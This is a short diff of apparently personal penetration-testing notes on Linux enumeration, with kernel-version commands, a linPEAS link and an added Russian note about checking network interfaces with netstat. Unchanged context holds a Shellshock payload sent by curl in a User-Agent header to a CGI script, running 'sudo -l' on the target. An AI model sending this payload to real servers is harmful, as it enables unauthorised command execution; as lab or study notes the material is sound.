@@ -17,7 +17,9 @@ https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
                     rpm -q kernel
                    dmesg | grep Linux
                     ls /boot | grep vmlinuz-
-       
+
+       сетевые интерфейсы, порты, службы;
+       netstat
 
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
